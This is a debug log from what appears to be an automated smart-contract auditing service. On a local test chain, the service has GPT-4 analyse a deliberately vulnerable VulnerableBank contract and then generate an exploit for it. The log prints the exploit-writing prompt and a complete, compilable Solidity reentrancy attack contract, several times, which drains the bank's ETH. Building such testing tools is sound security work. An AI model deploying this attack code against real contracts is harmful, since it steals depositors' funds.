\n- Then call `withdraw` from the malicious contract to trigger the reentrancy loop.  \n- The attacker can recursively withdraw ETH multiple times before the balance is updated, draining the contract.\n\n---\n\n**Summary:**  \n- **Contract:** VulnerableBank  \n- **Solidity Version:** ^0.8.0  \n- **Vulnerability:** Reentrancy in `withdraw` function due to updating balance after external call.  \n- **Impact:** Potential full drain of contract ETH.  \n- **Exploit Setup:** Attacker deposits ETH, then uses a malicious contract to reenter `withdraw` during ETH transfer.  \n\n**Recommendation:**  \n- Use the Checks-Effects-Interactions pattern: update the balance before sending ETH.  \n- Alternatively, use `ReentrancyGuard` or pull payments pattern.', 'contract_analysis': 'The contract `VulnerableBank` is a simple bank-like contract that allows users to deposit ETH and withdraw their deposited ETH. It maintains a `balances` mapping to track user deposits. The key functions are:  \n- `deposit()`: payable function that increases the caller‚Äôs balance by the sent amount.  \n- `withdraw(uint256 _amount)`: allows a user to withdraw a specified amount if they have sufficient balance. The function sends ETH to the caller using a low-level call, then updates the user‚Äôs balance after the transfer.  \n- `getBalance()`: returns the caller‚Äôs balance.\n\nThe contract is written in Solidity 0.8.0.\n\n2.', 'vulnerability_assessment': '**Reentrancy Vulnerability**:  \nThe `withdraw` function is vulnerable to a classic reentrancy attack because it:  \n- Sends ETH to the caller via `msg.sender.call{value: _amount}("")` before updating the user‚Äôs balance.  \n- The balance is updated **after** the external call.  \n\nThis allows an attacker contract to reenter the `withdraw` function during the external call and withdraw funds multiple times before the balance is updated, draining the contract‚Äôs ETH.\n\n**Mechanism:**  \n- Attacker deposits some ETH to have a positive balance.  \n- Calls `withdraw` to withdraw some amount.  \n- During the external call to `msg.sender.call`, the attacker‚Äôs fallback or receive function calls `withdraw` again before the balance is reduced.  \n- This repeats until the contract‚Äôs ETH is drained or the attacker stops.\n\n**Potential Impact:**  \n- Complete or partial draining of the contract‚Äôs ETH balance.  \n- Loss of user funds stored in the contract.\n\nNo other major vulnerabilities like permission issues or math errors are apparent since Solidity 0.8.0 has built-in overflow checks and the contract does not have owner-only functions or complex logic.\n\n3.', 'exploitation_requirements': '- The attacker must deploy a malicious contract with a fallback or receive function that calls `withdraw` again.  \n- The attacker must first deposit ETH into the `VulnerableBank` to have a positive balance.  \n- Then call `withdraw` from the malicious contract to trigger the reentrancy loop.  \n- The attacker can recursively withdraw ETH multiple times before the balance is updated, draining the contract.', 'analysis_duration': 14.197364330291748}, 'attack': {'attack_prompt': '\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The contract `VulnerableBank` is a simple bank-like contract that allows users to deposit ETH and withdraw their deposited ETH. It maintains a `balances` mapping to track user deposits. The key functions are:  \n- `deposit()`: payable function that increases the caller‚Äôs balance by the sent amount.  \n- `withdraw(uint256 _amount)`: allows a user to withdraw a specified amount if they have sufficient balance. The function sends ETH to the caller using a low-level call, then updates the user‚Äôs balance after the transfer.  \n- `getBalance()`: returns the caller‚Äôs balance.\n\nThe contract is written in Solidity 0.8.0.\n\n2.\n\nVulnerability Assessment: **Reentrancy Vulnerability**:  \nThe `withdraw` function is vulnerable to a classic reentrancy attack because it:  \n- Sends ETH to the caller via `msg.sender.call{value: _amount}("")` before updating the user‚Äôs balance.  \n- The balance is updated **after** the external call.  \n\nThis allows an attacker contract to reenter the `withdraw` function during the external call and withdraw funds multiple times before the balance is updated, draining the contract‚Äôs ETH.\n\n**Mechanism:**  \n- Attacker deposits some ETH to have a positive balance.  \n- Calls `withdraw` to withdraw some amount.  \n- During the external call to `msg.sender.call`, the attacker‚Äôs fallback or receive function calls `withdraw` again before the balance is reduced.  \n- This repeats until the contract‚Äôs ETH is drained or the attacker stops.\n\n**Potential Impact:**  \n- Complete or partial draining of the contract‚Äôs ETH balance.  \n- Loss of user funds stored in the contract.\n\nNo other major vulnerabilities like permission issues or math errors are apparent since Solidity 0.8.0 has built-in overflow checks and the contract does not have owner-only functions or complex logic.\n\n3.\n\nExploitation Requirements: - The attacker must deploy a malicious contract with a fallback or receive function that calls `withdraw` again.  \n- The attacker must first deposit ETH into the `VulnerableBank` to have a positive balance.  \n- Then call `withdraw` from the malicious contract to trigger the reentrancy loop.  \n- The attacker can recursively withdraw ETH multiple times before the balance is updated, draining the contract.\n\n\nTarget Contract Address: 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named \'attack\', \'exploit\', or \'run\')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n', 'attack_raw_response': '```solidity\npragma solidity 0.8.0;\n\ninterface IVulnerableBank {\n    function deposit() external payable;\n    function withdraw(uint256 _amount) external;\n    function getBalance() external view returns (uint256);\n}\n\ncontract ReentrancyAttack {\n    IVulnerableBank public vulnerableBank;\n    uint256 public attackAmount;\n\n    constructor(address _vulnerableBank) {\n        vulnerableBank = IVulnerableBank(_vulnerableBank);\n    }\n\n    function attack() external payable {\n        require(msg.value > 0, "Send ETH to attack");\n        attackAmount = msg.value;\n        vulnerableBank.deposit{value: msg.value}();\n        vulnerableBank.withdraw(msg.value);\n    }\n\n    receive() external payable {\n        uint256 bankBalance = address(vulnerableBank).balance;\n        if (bankBalance >= attackAmount) {\n            vulnerableBank.withdraw(attackAmount);\n        }\n    }\n\n    function collect() external {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}\n```', 'code': 'pragma solidity 0.8.0;\n\ninterface IVulnerableBank {\n    function deposit() external payable;\n    function withdraw(uint256 _amount) external;\n    function getBalance() external view returns (uint256);\n}\n\ncontract ReentrancyAttack {\n    IVulnerableBank public vulnerableBank;\n    uint256 public attackAmount;\n\n    constructor(address _vulnerableBank) {\n        vulnerableBank = IVulnerableBank(_vulnerableBank);\n    }\n\n    function attack() external payable {\n        require(msg.value > 0, "Send ETH to attack");\n        attackAmount = msg.value;\n        vulnerableBank.deposit{value: msg.value}();\n        vulnerableBank.withdraw(msg.value);\n    }\n\n    receive() external payable {\n        uint256 bankBalance = address(vulnerableBank).balance;\n        if (bankBalance >= attackAmount) {\n            vulnerableBank.withdraw(attackAmount);\n        }\n    }\n\n    function collect() external {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}', 'code_type': 'solidity', 'attack_duration': 4.030109405517578}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpxl6fuff8.sol",\n  "contracts": [\n    {\n      "contract_name": "VulnerableBank",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "deposit",\n          "outputs": [],\n          "stateMutability": "payable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deposit",\n          "signature": "deposit()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "payable",\n          "payable": true,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw(uint256)",\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99984357320000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 0\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 3000000000000000000\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getBalance": 0\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract VulnerableBank {\\n    mapping(address => uint256) public balances;\\n\\n    // Fonction pour d\\u00e9poser des fonds\\n    function deposit() public payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n\\n    // Fonction vuln\\u00e9rable de retrait\\n    function withdraw(uint256 _amount) public {\\n        require(balances[msg.sender] >= _amount, \\"Solde insuffisant\\");\\n\\n        // Envoi du montant demand\\u00e9\\n        (bool success, ) = msg.sender.call{value: _amount}(\\"\\");\\n        require(success, unicode\\"\\u00c9chec du transfert\\");\\n\\n        // Mise \\u00e0 jour du solde APR\\u00c8S le transfert\\n        balances[msg.sender] -= _amount;\\n    }\\n\\n    // Consulter le solde\\n    function getBalance() public view returns (uint256) {\\n        return balances[msg.sender];\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:  \nThe contract `VulnerableBank` is a simple bank-like contract that allows users to deposit ETH and withdraw their deposited ETH. It maintains a `balances` mapping to track user deposits. The key functions are:  \n- `deposit()`: payable function that increases the caller‚Äôs balance by the sent amount.  \n- `withdraw(uint256 _amount)`: allows a user to withdraw a specified amount if they have sufficient balance. The function sends ETH to the caller using a low-level call, then updates the user‚Äôs balance after the transfer.  \n- `getBalance()`: returns the caller‚Äôs balance.\n\nThe contract is written in Solidity 0.8.0.\n\n2. Vulnerability Assessment:  \n**Reentrancy Vulnerability**:  \nThe `withdraw` function is vulnerable to a classic reentrancy attack because it:  \n- Sends ETH to the caller via `msg.sender.call{value: _amount}("")` before updating the user‚Äôs balance.  \n- The balance is updated **after** the external call.  \n\nThis allows an attacker contract to reenter the `withdraw` function during the external call and withdraw funds multiple times before the balance is updated, draining the contract‚Äôs ETH.\n\n**Mechanism:**  \n- Attacker deposits some ETH to have a positive balance.  \n- Calls `withdraw` to withdraw some amount.  \n- During the external call to `msg.sender.call`, the attacker‚Äôs fallback or receive function calls `withdraw` again before the balance is reduced.  \n- This repeats until the contract‚Äôs ETH is drained or the attacker stops.\n\n**Potential Impact:**  \n- Complete or partial draining of the contract‚Äôs ETH balance.  \n- Loss of user funds stored in the contract.\n\nNo other major vulnerabilities like permission issues or math errors are apparent since Solidity 0.8.0 has built-in overflow checks and the contract does not have owner-only functions or complex logic.\n\n3. Exploitation Requirements:  \n- The attacker must deploy a malicious contract with a fallback or receive function that calls `withdraw` again.  \n- The attacker must first deposit ETH into the `VulnerableBank` to have a positive balance.  \n- Then call `withdraw` from the malicious contract to trigger the reentrancy loop.  \n- The attacker can recursively withdraw ETH multiple times before the balance is updated, draining the contract.\n\n---\n\n**Summary:**  \n- **Contract:** VulnerableBank  \n- **Solidity Version:** ^0.8.0  \n- **Vulnerability:** Reentrancy in `withdraw` function due to updating balance after external call.  \n- **Impact:** Potential full drain of contract ETH.  \n- **Exploit Setup:** Attacker deposits ETH, then uses a malicious contract to reenter `withdraw` during ETH transfer.  \n\n**Recommendation:**  \n- Use the Checks-Effects-Interactions pattern: update the balance before sending ETH.  \n- Alternatively, use `ReentrancyGuard` or pull payments pattern.', 'reasoning': 'The contract `VulnerableBank` is a simple bank-like contract that allows users to deposit ETH and withdraw their deposited ETH. It maintains a `balances` mapping to track user deposits. The key functions are:  \n- `deposit()`: payable function that increases the caller‚Äôs balance by the sent amount.  \n- `withdraw(uint256 _amount)`: allows a user to withdraw a specified amount if they have sufficient balance. The function sends ETH to the caller using a low-level call, then updates the user‚Äôs balance after the transfer.  \n- `getBalance()`: returns the caller‚Äôs balance.\n\nThe contract is written in Solidity 0.8.0.\n\n2.', 'summary': '**Reentrancy Vulnerability**:  \nThe `withdraw` function is vulnerable to a classic reentrancy attack because it:  \n- Sends ETH to the caller via `msg.sender.call{value: _amount}("")` before updating the user‚Äôs balance.  \n- The balance is updated **after** the external call.  \n\nThis allows an attacker contract to reenter the `withdraw` function during the external call and withdraw funds multiple times before the balance is updated, draining the contract‚Äôs ETH.\n\n**Mechanism:**  \n- Attacker deposits some ETH to have a positive balance.  \n- Calls `withdraw` to withdraw some amount.  \n- During the external call to `msg.sender.call`, the attacker‚Äôs fallback or receive function calls `withdraw` again before the balance is reduced.  \n- This repeats until the contract‚Äôs ETH is drained or the attacker stops.\n\n**Potential Impact:**  \n- Complete or partial draining of the contract‚Äôs ETH balance.  \n- Loss of user funds stored in the contract.\n\nNo other major vulnerabilities like permission issues or math errors are apparent since Solidity 0.8.0 has built-in overflow checks and the contract does not have owner-only functions or complex logic.\n\n3.', 'code': 'pragma solidity 0.8.0;\n\ninterface IVulnerableBank {\n    function deposit() external payable;\n    function withdraw(uint256 _amount) external;\n    function getBalance() external view returns (uint256);\n}\n\ncontract ReentrancyAttack {\n    IVulnerableBank public vulnerableBank;\n    uint256 public attackAmount;\n\n    constructor(address _vulnerableBank) {\n        vulnerableBank = IVulnerableBank(_vulnerableBank);\n    }\n\n    function attack() external payable {\n        require(msg.value > 0, "Send ETH to attack");\n        attackAmount = msg.value;\n        vulnerableBank.deposit{value: msg.value}();\n        vulnerableBank.withdraw(msg.value);\n    }\n\n    receive() external payable {\n        uint256 bankBalance = address(vulnerableBank).balance;\n        if (bankBalance >= attackAmount) {\n            vulnerableBank.withdraw(attackAmount);\n        }\n    }\n\n    function collect() external {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}', 'code_type': 'solidity', 'duration': 18.227473735809326}
2025-07-05 13:05:06,332 - app.services.contract_service - INFO - Has exploit code: True
2025-07-05 13:05:06,334 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-05 13:05:06,335 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-07-05 13:05:06,337 - app.services.contract_service - INFO - Attack strategy summary: **Reentrancy Vulnerability**:  
The `withdraw` function is vulnerable to a classic reentrancy attack because it:  
- Sends ETH to the caller via `msg.sender.call{value: _amount}("")` before updating the user‚Äôs balance.  
- The balance is updated **after** the external call.  

This allows an attacker contract to reenter the `withdraw` function during the external call and withdraw funds multiple times before the balance is updated, draining the contract‚Äôs ETH.

**Mechanism:**  
- Attacker deposits some ETH to have a positive balance.  
- Calls `withdraw` to withdraw some amount.  
- During the external call to `msg.sender.call`, the attacker‚Äôs fallback or receive function calls `withdraw` again before the balance is reduced.  
- This repeats until the contract‚Äôs ETH is drained or the attacker stops.

**Potential Impact:**  
- Complete or partial draining of the contract‚Äôs ETH balance.  
- Loss of user funds stored in the contract.

No other major vulnerabilities like permission issues or math errors are apparent since Solidity 0.8.0 has built-in overflow checks and the contract does not have owner-only functions or complex logic.

3.
2025-07-05 13:05:06,339 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-07-05 13:05:06,341 - app.services.contract_service - INFO - Temporary file /tmp/tmpxl6fuff8.sol removed
2025-07-05 13:05:06,383 - app.api.contract - INFO - Report saved with filename: VulnerableBank_2025-07-05_13-05, status: KO
2025-07-05 13:05:06,385 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-07-05 13:05:06,386 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:05:06,388 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:05:06,389 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:05:06,390 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:05:06,392 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:05:06] "POST /analyze HTTP/1.1" 200 -
2025-07-05 13:05:08,003 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:05:08,005 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:05:08,007 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:05:08,009 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:05:08,012 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:05:08] "GET /history HTTP/1.1" 200 -
2025-07-05 13:05:21,029 - flask_cors.extension - DEBUG - Request to ''/analysis/status/3'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:05:21,034 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:05:21,037 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:05:21,041 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:05:21,044 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-05 13:05:21,048 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:05:21] "[33mGET /analysis/status/3 HTTP/1.1[0m" 404 -
2025-07-05 13:05:28,898 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:05:28,917 - app.api.contract - INFO - Analyzing code snippet
2025-07-05 13:05:28,929 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-07-05 13:05:28,933 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpnijsyvg8.sol
2025-07-05 13:05:28,944 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-05 13:05:28,946 - app.services.contract_service - INFO - Compiling contract...
2025-07-05 13:05:28,958 - solcx - INFO - Using solc version 0.8.0
2025-07-05 13:05:29,656 - app.services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-07-05 13:05:29,657 - app.services.contract_service - INFO - Deploying 1 contracts...
2025-07-05 13:05:30,061 - app.services.contract_service - INFO - Contract VulnerableBank deployed at 0x254dffcd3277C0b1660F6d42EFbB754edaBAbC2B
2025-07-05 13:05:30,063 - app.services.contract_service - INFO - Setting up contract VulnerableBank...
2025-07-05 13:05:30,472 - app.services.contract_service - INFO - Contract VulnerableBank setup completed
2025-07-05 13:05:30,474 - app.services.contract_service - INFO - Funding contract VulnerableBank for attack testing...
2025-07-05 13:05:30,883 - app.services.contract_service - INFO - Contract VulnerableBank funded
2025-07-05 13:05:30,885 - app.services.contract_service - INFO - Building contract observation...
2025-07-05 13:05:31,336 - app.services.contract_service - INFO - Contract observation built successfully
2025-07-05 13:05:31,337 - app.services.contract_service - INFO - Generating attack strategy...
2025-07-05 13:05:31,339 - app.services.contract_service - INFO - Running Slither analysis...
2025-07-05 13:05:31,348 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-07-05 13:05:31,358 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-07-05 13:05:31,360 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-05 13:05:31,362 - app.modules.attack_generator - INFO - Contract name: VulnerableBank
2025-07-05 13:05:31,362 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-07-05 13:05:31,364 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-05 13:05:31,366 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:05:31,367 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:05:31,368 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:05:42,238 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:05:42,261 - app.modules.attack_generator - INFO - Received response from OpenAI API in 10.89 seconds
2025-07-05 13:05:42,267 - app.modules.attack_generator - INFO - Contract analysis completed in 10.89 seconds
2025-07-05 13:05:42,269 - app.modules.attack_generator - INFO - Vulnerability assessment: **

- **Reentrancy Vulnerability:**  
  The `withdraw` function is vulnerable to a classic reentranc...
2025-07-05 13:05:42,272 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-05 13:05:42,275 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:05:42,276 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:05:42,278 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:05:47,543 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:05:47,553 - app.api.contract - INFO - Analyzing code snippet
2025-07-05 13:05:47,569 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-07-05 13:05:47,573 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp5_sqpw4u.sol
2025-07-05 13:05:47,584 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-05 13:05:47,585 - app.services.contract_service - INFO - Compiling contract...
2025-07-05 13:05:47,707 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.4.17+commit.bdeb9e52
2025-07-05 13:05:48,228 - solcx - INFO - solc 0.4.17 successfully installed at: /root/.solcx/solc-v0.4.17
2025-07-05 13:05:48,235 - solcx - INFO - Using solc version 0.4.17
2025-07-05 13:05:49,726 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:05:49,736 - app.modules.attack_generator - INFO - Received response from OpenAI API in 7.46 seconds
2025-07-05 13:05:49,739 - app.modules.attack_generator - INFO - Attack code generation completed in 7.46 seconds
2025-07-05 13:05:49,741 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 988
2025-07-05 13:05:49,742 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 18.35 seconds
2025-07-05 13:05:49,743 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-05 13:05:49,746 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpnijsyvg8.sol",\n  "contracts": [\n    {\n      "contract_name": "VulnerableBank",\n      "address": "0x254dffcd3277C0b1660F6d42EFbB754edaBAbC2B",\n      "abi": [\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          